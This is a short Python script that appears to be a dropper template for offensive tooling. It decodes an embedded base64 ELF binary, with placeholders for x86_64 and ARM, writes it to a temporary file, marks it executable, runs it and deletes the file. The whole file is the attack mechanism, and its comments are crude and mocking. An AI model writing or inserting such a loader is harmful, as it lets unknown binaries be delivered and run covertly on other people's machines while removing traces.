import os
import platform
import base64
import tempfile
import subprocess

X86_64_ELF = "{{ X86_64_ELF }}"
ARM_ELF = "{{ ARM_ELF }}"


def load(encoded_elf):
    temp = tempfile.NamedTemporaryFile()
    fd_handle, tempfile_path = tempfile.mkstemp()
    fd = os.fdopen(fd_handle, mode="wb")
    try:
        decoded_elf = base64.b64decode(encoded_elf)
        # we can only exec if we arent busy, so write and close
        fd.write(decoded_elf)
        fd.close()

        # we can only exec with +x perms, so, add that lol
        subprocess.check_output(["chmod", "+x", tempfile_path])

        # RUN LMAO
        subprocess.check_output([tempfile_path])
    finally:
        os.unlink(tempfile_path)


def main():
    arch = platform.machine()
    if arch == "x86_64":
        load(X86_64_ELF)
    elif arch == "arm":
        load(ARM_ELF)
    else:
        print("fuck your cpu", arch)


if __name__ == "__main__":
    main()
